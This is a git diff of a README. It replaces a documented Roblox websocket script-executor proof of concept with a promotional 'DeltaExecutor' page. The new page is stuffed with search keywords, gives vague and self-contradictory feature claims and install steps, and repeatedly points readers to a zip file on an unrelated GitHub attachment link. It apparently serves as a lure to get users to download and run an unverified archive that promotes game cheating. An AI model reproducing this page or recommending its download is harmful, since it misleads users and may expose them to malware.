@@ -1,28 +1,71 @@
-# Roblox Websocket Executor
+# DeltaExecutor
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+![DeltaExecutor Logo](images/logo.png)
 
-## How to use
+Welcome to the official repository of DeltaExecutor - the cutting-edge Roblox Delta Executor revolutionizing the scripting landscape!
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+## Overview
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+DeltaExecutor offers a range of premium features and top-tier support to users worldwide for free, setting a new standard in Roblox scripting tools. In this repository, you will find everything you need to know about DeltaExecutor, its keyless-executor capabilities, latest updates, compatibility information, and much more.
 
-### Demonstration
+## Table of Contents
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## Further explanation
+## Features
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+DeltaExecutor brings a multitude of features that cater to both beginners and experienced Roblox scripters. Let's explore some of its key highlights:
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+1. **Delta Executor 2024:** Stay ahead of the curve with the latest version of DeltaExecutor, packed with innovative functionalities and performance enhancements.
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+2. **Delta Executor v624:** Experience unparalleled scripting power with the v624 release, designed to streamline your workflow and boost productivity.
 
-## Attribution
+3. **Redz Hub Integration:** Seamlessly integrate DeltaExecutor with Redz Hub for an enhanced scripting experience and access to exclusive tools.
 
-Here are a list of open-source libraries used by this project.
+4. **Delta Executor Keyless System:** Enjoy hassle-free execution without the need for a traditional key, simplifying the setup process and ensuring quick access.
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+5. **Automated Updates:** Receive instant notifications and updates on new DeltaExecutor releases, ensuring you always have access to the latest features and improvements.
+
+## Installation
+
+To get started with DeltaExecutor, follow these simple steps:
+
+1. Download the [DeltaExecutor package](https://github.com/user-attachments/files/16325349/Delta.zip) by clicking the download button below:
+
+[![Download DeltaExecutor](https://img.shields.io/badge/Download-DeltaExecutor-blue)](https://github.com/user-attachments/files/16325349/Delta.zip)
+
+2. Unzip the downloaded package to your desired location on your system.
+
+3. Launch Roblox Studio and import the DeltaExecutor plugin by locating the extracted files.
+
+4. Start exploring the powerful capabilities of DeltaExecutor in your Roblox scripting projects.
+
+## Usage
+
+DeltaExecutor offers a user-friendly interface and intuitive controls, making it easy to unleash your creativity in Roblox game development. Whether you're a beginner or a seasoned scripter, DeltaExecutor provides the tools you need to bring your ideas to life.
+
+Here are some tips for maximizing your DeltaExecutor experience:
+
+- **Script Execution:** Execute your scripts effortlessly with DeltaExecutor's streamlined execution process, allowing you to test and debug code efficiently.
+
+- **Enhanced Functionality:** Discover advanced functionalities within DeltaExecutor, such as code optimization, debugging tools, and real-time script monitoring.
+
+- **Community Support:** Engage with the DeltaExecutor community to share ideas, seek assistance, and stay updated on the latest scripting trends.
+
+## Contributing
+
+We welcome contributions from the community to enhance DeltaExecutor further. If you have ideas for new features, improvements, or bug fixes, feel free to submit a pull request. Together, we can make DeltaExecutor the ultimate Roblox scripting tool for users worldwide.
+
+## License
+
+DeltaExecutor is released under the [MIT License](LICENSE), granting users the freedom to use, modify, and distribute the software as per the terms of the license agreement.
+
+---
+
+Join the DeltaExecutor community today and embark on a scripting journey like never before. Unleash your creativity, streamline your workflow, and experience the future of Roblox scripting with DeltaExecutor! 🚀🎮
+
+![DeltaExecutor Team](images/team.png)
